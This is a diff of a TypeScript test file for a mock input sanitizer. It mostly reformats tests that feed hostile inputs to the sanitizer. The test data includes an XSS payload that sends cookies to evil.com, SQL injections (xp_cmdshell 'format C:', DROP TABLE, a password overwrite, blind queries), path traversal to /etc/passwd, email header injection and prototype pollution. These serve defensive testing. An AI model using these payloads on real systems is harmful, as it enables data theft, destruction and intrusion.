@@ -1,7 +1,7 @@
 /**
  * Critical Security Tests - Modern Input Sanitizer
  * Following Living Spiral Methodology - Security Guardian & Vulnerability Prevention
- * 
+ *
  * Test Coverage Areas:
  * - XSS (Cross-Site Scripting) prevention
  * - SQL injection prevention
@@ -24,7 +24,7 @@ class MockModernInputSanitizer {
    */
   sanitizeHtml(input: string): string {
     if (!input) return '';
-    
+
     // Remove script tags and dangerous attributes
     return input
       .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
@@ -42,19 +42,19 @@ class MockModernInputSanitizer {
    */
   sanitizeSql(input: string): string {
     if (!input) return '';
-    
+
     // Remove common SQL injection patterns
     const dangerous = [
       /('|(\\')|(;)|(\-\-)|(\s+(or|and)\s+)|(\s+(union|select|insert|update|delete|drop|create|alter|exec|execute)\s+)/gi,
       /(\bexec\b|\bexecute\b|\bsp_\b|\bxp_\b)/gi,
-      /(script|javascript|vbscript)/gi
+      /(script|javascript|vbscript)/gi,
     ];
-    
+
     let sanitized = input;
     dangerous.forEach(pattern => {
       sanitized = sanitized.replace(pattern, '');
     });
-    
+
     return sanitized.replace(/['"\\;]/g, '');
   }
 
@@ -63,7 +63,7 @@ class MockModernInputSanitizer {
    */
   sanitizePath(input: string): string {
     if (!input) return '';
-    
+
     // Remove path traversal patterns
     return input
       .replace(/\.\.\//g, '')
@@ -78,15 +78,18 @@ class MockModernInputSanitizer {
    */
   sanitizeCommand(input: string): string {
     if (!input) return '';
-    
+
     // Remove dangerous command characters
     const dangerous = [';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r'];
     let sanitized = input;
-    
+
     dangerous.forEach(char => {
-      sanitized = sanitized.replace(new RegExp(char.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), '');
+      sanitized = sanitized.replace(
+        new RegExp(char.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'),
+        ''
+      );
     });
-    
+
     return sanitized;
   }
 
@@ -95,10 +98,10 @@ class MockModernInputSanitizer {
    */
   sanitizeEmail(input: string): string | null {
     if (!input) return null;
-    
+
     const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
     const sanitized = input.trim().toLowerCase();
-    
+
     return emailRegex.test(sanitized) ? sanitized : null;
   }
 
@@ -110,7 +113,7 @@ class MockModernInputSanitizer {
       // Remove dangerous operators
       return input.replace(/\$\w+/g, '').replace(/\{\s*\$\w+/g, '{');
     }
-    
+
     if (typeof input === 'object' && input !== null) {
       const sanitized: any = {};
       for (const [key, value] of Object.entries(input)) {
@@ -120,14 +123,17 @@ class MockModernInputSanitizer {
       }
       return sanitized;
     }
-    
+
     return input;
   }
 
   /**
    * Comprehensive input validation
    */
-  validate(input: any, type: 'html' | 'sql' | 'path' | 'command' | 'email' | 'json'): {
+  validate(
+    input: any,
+    type: 'html' | 'sql' | 'path' | 'command' | 'email' | 'json'
+  ): {
     isValid: boolean;
     sanitized: any;
     threats: string[];
@@ -147,7 +153,7 @@ class MockModernInputSanitizer {
             if (originalHtml.includes('javascript:')) threats.push('JAVASCRIPT_PROTOCOL');
           }
           break;
-          
+
         case 'sql':
           const originalSql = input;
           sanitized = this.sanitizeSql(input);
@@ -157,7 +163,7 @@ class MockModernInputSanitizer {
             if (originalSql.includes(';')) threats.push('STATEMENT_TERMINATION');
           }
           break;
-          
+
         case 'path':
           const originalPath = input;
           sanitized = this.sanitizePath(input);
@@ -166,7 +172,7 @@ class MockModernInputSanitizer {
             if (originalPath.includes('../')) threats.push('DIRECTORY_TRAVERSAL');
           }
           break;
-          
+
         case 'command':
           const originalCommand = input;
           sanitized = this.sanitizeCommand(input);
@@ -176,13 +182,13 @@ class MockModernInputSanitizer {
             if (originalCommand.includes(';')) threats.push('COMMAND_CHAINING');
           }
           break;
-          
+
         case 'email':
           sanitized = this.sanitizeEmail(input);
           isValid = sanitized !== null;
           if (!isValid) threats.push('INVALID_EMAIL');
           break;
-          
+
         case 'json':
           const originalJson = JSON.stringify(input);
           sanitized = this.sanitizeJson(input);
@@ -226,7 +232,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
 
       xssAttempts.forEach(attempt => {
         const result = sanitizer.validate(attempt, 'html');
-        
+
         expect(result.isValid).toBe(false);
         expect(result.threats).toContain('XSS_ATTEMPT');
         expect(result.sanitized).not.toContain('<script');
@@ -248,7 +254,8 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
     });
 
     it('should handle complex nested XSS attempts', () => {
-      const complexXss = '<div><script>var img = new Image(); img.src="http://evil.com/steal?cookie="+document.cookie;</script><p>Innocent content</p></div>';
+      const complexXss =
+        '<div><script>var img = new Image(); img.src="http://evil.com/steal?cookie="+document.cookie;</script><p>Innocent content</p></div>';
       const result = sanitizer.validate(complexXss, 'html');
 
       expect(result.isValid).toBe(false);
@@ -270,7 +277,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         "'; EXEC xp_cmdshell('format C:'); --",
         "1'; UPDATE users SET password='hacked' WHERE username='admin'; --",
         "' AND (SELECT COUNT(*) FROM users) > 0 --",
-        "'; WAITFOR DELAY '00:00:10'; --"
+        "'; WAITFOR DELAY '00:00:10'; --",
       ];
 
       sqlInjections.forEach(injection => {
@@ -289,7 +296,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         'john.doe@company.com',
         'Product Name 123',
         'Valid description text',
-        'user123'
+        'user123',
       ];
 
       safeInputs.forEach(input => {
@@ -305,7 +312,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
         "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64",
         "'; IF (1=1) WAITFOR DELAY '00:00:05'; --",
-        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
+        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
       ];
 
       blindSqlInjections.forEach(injection => {
@@ -347,7 +354,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         'documents/file.txt',
         'images/photo.jpg',
         'data/report.pdf',
-        'temp/upload_123.tmp'
+        'temp/upload_123.tmp',
       ];
 
       safePaths.forEach(path => {
@@ -362,9 +369,13 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
       const windowsAttacks = [
         'C:\\windows\\system32\\cmd.exe',
         '\\\\server\\share\\malicious.exe',
-        'CON', 'PRN', 'AUX', 'NUL', // Windows reserved names
-        'LPT1', 'COM1',
-        'file.txt:alternate_data_stream'
+        'CON',
+        'PRN',
+        'AUX',
+        'NUL', // Windows reserved names
+        'LPT1',
+        'COM1',
+        'file.txt:alternate_data_stream',
       ];
 
       windowsAttacks.forEach(attack => {
@@ -404,12 +415,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
     });
 
     it('should allow safe command arguments', () => {
-      const safeCommands = [
-        'filename.txt',
-        'user123',
-        'valid-argument',
-        '/safe/path/file.log'
-      ];
+      const safeCommands = ['filename.txt', 'user123', 'valid-argument', '/safe/path/file.log'];
 
       safeCommands.forEach(command => {
         const result = sanitizer.validate(command, 'command');
@@ -426,7 +432,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         'user@example.com',
         'test.email@domain.co.uk',
         'user+tag@company.org',
-        'firstname.lastname@subdomain.example.com'
+        'firstname.lastname@subdomain.example.com',
       ];
 
       validEmails.forEach(email => {
@@ -446,7 +452,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         'user@example.com%0A%0DBcc:hacker@evil.com',
         'user@[192.168.1.1]', // IP address in brackets
         'user@localhost', // Local domain
-        'admin@evil.com\x00hidden@domain.com'
+        'admin@evil.com\x00hidden@domain.com',
       ];
 
       maliciousEmails.forEach(email => {
@@ -483,7 +489,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
       const safeObjects = [
         { username: 'john', password: 'securepassword' },
         { name: 'Product', price: 99.99, available: true },
-        { email: 'user@example.com', preferences: ['email', 'sms'] }
+        { email: 'user@example.com', preferences: ['email', 'sms'] },
       ];
 
       safeObjects.forEach(obj => {
@@ -511,8 +517,9 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         const commandResult = sanitizer.validate(polyglot, 'command');
 
         // At least one should detect the threat
-        const anyDetected = [htmlResult, sqlResult, commandResult]
-          .some(result => !result.isValid && result.threats.length > 0);
+        const anyDetected = [htmlResult, sqlResult, commandResult].some(
+          result => !result.isValid && result.threats.length > 0
+        );
 
         expect(anyDetected).toBe(true);
       });
@@ -526,7 +533,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         sanitizer.validate(largPayload, 'html'),
         sanitizer.validate(largeScript, 'html'),
         sanitizer.validate(largPayload, 'sql'),
-        sanitizer.validate(largPayload, 'command')
+        sanitizer.validate(largPayload, 'command'),
       ];
 
       // Should handle large payloads without crashing
@@ -539,8 +546,8 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
 
     it('should prevent prototype pollution attacks', () => {
       const prototypePollution = {
-        "__proto__": { "isAdmin": true },
-        "constructor": { "prototype": { "isAdmin": true } }
+        __proto__: { isAdmin: true },
+        constructor: { prototype: { isAdmin: true } },
       };
 
       const result = sanitizer.validate(prototypePollution, 'json');
@@ -557,7 +564,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         "'; DROP TABLE users; --",
         '../../../etc/passwd',
         'user@example.com',
-        { username: { $ne: null } }
+        { username: { $ne: null } },
       ];
 
       const startTime = process.hrtime.bigint();
@@ -589,7 +596,7 @@ describe('ModernInputSanitizer - Critical Security Tests', () => {
         Symbol('test'),
         new Date(),
         /regex/,
-        function() {}
+        function () {},
       ];
 
       edgeCases.forEach(edgeCase => {
